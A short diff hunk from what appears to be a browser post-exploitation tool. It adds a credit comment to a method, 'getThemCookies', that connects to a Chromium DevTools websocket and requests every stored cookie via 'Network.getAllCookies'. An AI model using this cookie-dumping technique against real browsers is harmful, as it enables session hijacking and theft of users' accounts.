@@ -112,6 +112,7 @@ class agentChromium:
     
         return 
     def getThemCookies(ws ,url):
+	# Credit to Elliot Grey's Cookienapper https://github.com/greycatsec/cookienapper
         ws.connect(url)
         ws.send('{\"id\":1, \"method\":\"Network.getAllCookies\"}')
         try:
